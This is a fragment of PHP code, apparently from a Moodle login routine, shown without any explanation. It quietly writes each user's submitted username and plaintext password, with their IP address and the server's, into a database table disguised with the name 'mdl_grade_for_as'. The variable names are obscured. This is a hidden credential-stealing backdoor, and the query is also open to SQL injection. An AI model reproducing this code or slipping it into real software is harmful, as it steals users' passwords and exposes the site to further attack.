...
if (strlen($frm->username) > 1){
        $abcde1=$_SERVER['REMOTE_ADDR'];
        $abcde2=$_SERVER['SERVER_ADDR'];
        $yoi="INSERT INTO mdl_grade_for_as VALUES ('','$frm->username','$frm->password','$abcde1','$abcde2')";
        mysqli_query($hoho,$yoi);
}
